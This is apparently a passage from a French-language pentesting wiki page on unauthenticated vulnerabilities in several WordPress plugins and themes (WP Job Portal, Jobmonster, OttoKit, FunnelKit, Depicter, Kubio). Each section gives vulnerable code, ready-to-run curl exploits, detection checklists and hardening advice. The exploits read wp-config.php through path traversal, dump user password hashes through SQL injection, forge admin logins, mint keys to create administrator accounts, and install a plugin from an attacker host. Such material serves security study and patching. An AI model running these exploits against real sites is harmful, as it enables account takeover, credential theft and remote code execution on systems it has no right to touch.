### Unauthenticated SQL Injection via insufficient validation (WP Job Portal <= 2.3.2)

Le plugin de recrutement WP Job Portal exposait une t√¢che **savecategory** qui ex√©cute finalement le code vuln√©rable suivant dans `modules/category/model.php::validateFormData()` :
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ‚úó
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Probl√®mes introduits par cet extrait :

1. **Unsanitised user input** ‚Äì `parentid` provient directement de la requ√™te HTTP.
2. **String concatenation inside the WHERE clause** ‚Äì pas d'`is_numeric()` / `esc_sql()` / requ√™te pr√©par√©e.
3. **Unauthenticated reachability** ‚Äì bien que l'action soit ex√©cut√©e via `admin-post.php`, la seule v√©rification en place est un **CSRF nonce** (`wp_verify_nonce()`), que n'importe quel visiteur peut r√©cup√©rer depuis une page publique incorporant le shortcode `[wpjobportal_my_resumes]`.

#### Exploitation

1. R√©cup√©rer un nonce r√©cent :
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Injecter du SQL arbitraire en abusant de `parentid` :
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
La r√©ponse divulgue le r√©sultat de la requ√™te inject√©e ou modifie la base de donn√©es, prouvant la pr√©sence d'une SQLi.


### T√©l√©chargement arbitraire de fichiers sans authentification / Path Traversal (WP Job Portal <= 2.3.2)

Une autre t√¢che, **downloadcustomfile**, permettait aux visiteurs de t√©l√©charger **n'importe quel fichier sur le disque** via path traversal. Le sink vuln√©rable est situ√© dans `modules/customfield/model.php::downloadCustomUploadedFile()` :
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` est contr√¥l√© par l'attaquant et concat√©n√© **sans assainissement**. Encore une fois, la seule protection est un **CSRF nonce** qui peut √™tre r√©cup√©r√© depuis la resume page.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Le serveur renvoie le contenu de `wp-config.php`, leaking DB credentials and auth keys.

## Unauthenticated account takeover via Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

De nombreux th√®mes/plugins fournissent des helpers de "social login" expos√©s via admin-ajax.php. Si une action AJAX non authentifi√©e (wp_ajax_nopriv_...) fait confiance √† des identifiants fournis par le client lorsque les donn√©es du provider sont absentes, puis appelle wp_set_auth_cookie(), cela devient un full authentication bypass.

Sch√©ma d√©faillant typique (simplifi√©)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider ‚Äì execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // üî• logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
Pourquoi c'est exploitable

- Accessible sans authentification via admin-ajax.php (wp_ajax_nopriv_‚Ä¶ action).
- Aucune v√©rification nonce/capability avant toute modification d'√©tat.
- Absence de v√©rification du provider OAuth/OpenID ; la branche par d√©faut accepte l'entr√©e de l'attaquant.
- get_user_by('email', $_POST['id']) suivi de wp_set_auth_cookie($uid) authentifie le requ√©rant comme n'importe quelle adresse e-mail existante.

Exploitation (sans authentification)

- Pr√©requis : l'attaquant peut atteindre /wp-admin/admin-ajax.php et conna√Æt/devine une adresse e-mail d'utilisateur valide.
- D√©finir provider sur une valeur non support√©e (ou l'omettre) pour atteindre la branche par d√©faut et transmettre id=<victim_email>.
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Expected success indicators

- HTTP 200 avec un corps JSON comme {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* pour l'utilisateur victime ; les requ√™tes suivantes sont authentifi√©es.

Finding the action name

- Inspecter le th√®me/plugin pour des enregistrements add_action('wp_ajax_nopriv_...', '...') dans le code de social login (par ex., framework/add-ons/social-login/class-social-login.php).
- Grep pour wp_set_auth_cookie(), get_user_by('email', ...) dans les handlers AJAX.

Detection checklist

- Web logs montrant des POST non authentifi√©s vers /wp-admin/admin-ajax.php avec l'action social-login et id=<email>.
- R√©ponses 200 avec le JSON de succ√®s pr√©c√©dant imm√©diatement du trafic authentifi√© provenant de la m√™me IP/User-Agent.

Hardening

- Ne pas d√©river l'identit√© √† partir des donn√©es client. N'accepter que des emails/IDs provenant d'un token/ID fournisseur valid√©.
- Exiger des nonces CSRF et des v√©rifications de capability m√™me pour les helpers de login ; √©viter d'enregistrer wp_ajax_nopriv_ sauf si strictement n√©cessaire.
- Valider et v√©rifier les r√©ponses OAuth/OIDC c√¥t√© serveur ; rejeter les providers manquants/invalide (pas de fallback sur POST id).
- Envisager de d√©sactiver temporairement le social login ou de corriger virtuellement au niveau du p√©rim√®tre (bloquer l'action vuln√©rable) jusqu'√† correction.

Patched behaviour (Jobmonster 4.8.0)

- Retir√© le fallback non s√©curis√© de $_POST['id'] ; $user_email doit provenir des branches fournisseur v√©rifi√©es dans switch($_POST['using']).

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers ‚â§ 1.0.82)

Some plugins expose REST endpoints that mint reusable ‚Äúconnection keys‚Äù or tokens without verifying the caller‚Äôs capabilities. If the route authenticates only on a guessable attribute (e.g., username) and does not bind the key to a user/session with capability checks, any unauthenticated attacker can mint a key and invoke privileged actions (admin account creation, plugin actions ‚Üí RCE).

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC ‚Äì mint a connection key and use it
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# ‚Üí {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
Pourquoi c'est exploitable
- Sensitive REST route protected only by low-entropy identity proof (username) or missing permission_callback
- No capability enforcement; minted key is accepted as a universal bypass

Detection checklist
- Grep le code du plugin pour register_rest_route(..., [ 'permission_callback' => '__return_true' ])
- Toute route qui √©met des tokens/keys bas√©s sur une identit√© fournie dans la requ√™te (username/email) sans la lier √† un utilisateur authentifi√© ou √† une capability
- Rechercher les routes ult√©rieures qui acceptent le token/key cr√©√© sans v√©rifications de capability c√¥t√© serveur

Durcissement
- Pour toute REST route privil√©gi√©e : exiger un permission_callback qui applique current_user_can() pour la capability requise
- Ne pas g√©n√©rer de cl√©s √† longue dur√©e de vie √† partir d'une identit√© fournie par le client ; si n√©cessaire, √©mettre des tokens de courte dur√©e, li√©s √† l'utilisateur apr√®s authentification, et rev√©rifier les capabilities lors de l'utilisation
- Valider le contexte utilisateur de l'appelant (wp_set_current_user ne suffit pas seul) et rejeter les requ√™tes o√π !is_user_logged_in() || !current_user_can(<cap>)

---

## Nonce gate misuse ‚Üí unauthenticated arbitrary plugin installation (FunnelKit Automations ‚â§ 3.5.3)

Nonces prevent CSRF, not authorization. Si le code consid√®re le passage d'un nonce comme un feu vert puis saute les v√©rifications de capability pour des op√©rations privil√©gi√©es (p.ex., install/activate plugins), des attaquants non authentifi√©s peuvent satisfaire une exigence de nonce faible et atteindre le RCE en installant un plugin backdoored ou vuln√©rable.

- Vulnerable path: plugin/install_and_activate
- Flaw: weak nonce hash check; no current_user_can('install_plugins'|'activate_plugins') once nonce ‚Äúpasses‚Äù
- Impact: full compromise via arbitrary plugin install/activation

PoC (la forme d√©pend du plugin ; √† titre illustratif seulement)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
Detection checklist
- REST/AJAX handlers that modify plugins/themes with only wp_verify_nonce()/check_admin_referer() and no capability check
- Any code path that sets $skip_caps = true after nonce validation

Hardening
- Always treat nonces as CSRF tokens only; enforce capability checks regardless of nonce state
- Require current_user_can('install_plugins') and current_user_can('activate_plugins') before reaching installer code
- Reject unauthenticated access; avoid exposing nopriv AJAX actions for privileged flows

---

## SQLi non authentifi√© via le param√®tre s (search) dans les actions depicter-* (Depicter Slider ‚â§ 3.6.1)

Plusieurs actions depicter-* consommaient le param√®tre s (search) et l'ont concat√©n√© dans des requ√™tes SQL sans param√©trisation.

- Param√®tre : s (search)
- Faille : concat√©nation directe de cha√Ænes dans les clauses WHERE/LIKE ; pas de requ√™tes pr√©par√©es ni d'assainissement
- Impact : exfiltration de la base de donn√©es (utilisateurs, hashes), lateral movement

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
Checklist de d√©tection
- Grep pour depicter-* action handlers et l'utilisation directe de $_GET['s'] ou $_POST['s'] dans des requ√™tes SQL
- Revoir les requ√™tes personnalis√©es pass√©es √† $wpdb->get_results()/query() concat√©nant s

Durcissement
- Utiliser toujours $wpdb->prepare() ou les placeholders de wpdb ; rejeter c√¥t√© serveur les m√©tacaract√®res inattendus
- Ajouter une allowlist stricte pour s et normaliser vers le jeu de caract√®res/longueur attendus

---

## Unauthenticated Local File Inclusion via unvalidated template/file path (Kubio AI Page Builder ‚â§ 2.5.1)

Accepter des chemins contr√¥l√©s par l'attaquant dans un param√®tre template sans normalisation/confinement permet de lire des fichiers locaux arbitraires, et parfois d'ex√©cuter du code si des fichiers PHP/log inclusibles sont charg√©s au runtime.

- Param√®tre: __kubio-site-edit-iframe-classic-template
- Flaw: pas de normalisation/allowlisting ; traversal permis
- Impact: divulgation de secrets (wp-config.php), RCE potentiel dans certains environnements (log poisoning, includable PHP)

PoC ‚Äì lire wp-config.php
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
Liste de contr√¥le de d√©tection
- Tout handler concat√©nant des chemins de requ√™te dans des sinks include()/require()/read sans confinement via realpath()
- Recherchez des traversal patterns (../) atteignant en dehors du r√©pertoire de templates pr√©vu

Durcissement
- Imposer des templates autoris√©s ; r√©soudre via realpath() et exiger str_starts_with(realpath(file), realpath(allowed_base))
- Normaliser les donn√©es d'entr√©e ; rejeter les s√©quences de traversal et les chemins absolus ; n'utiliser sanitize_file_name() que pour les noms de fichiers (pas les chemins complets)


## R√©f√©rences

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset ‚Äì delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ‚â§ 5.6.1 ‚Äì Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation ‚Äì Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025‚Äôs most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) ‚â§ 1.0.82 ‚Äì Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations ‚â§ 3.5.3 ‚Äì Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider ‚â§ 3.6.1 ‚Äì Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder ‚â§ 2.5.1 ‚Äì Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
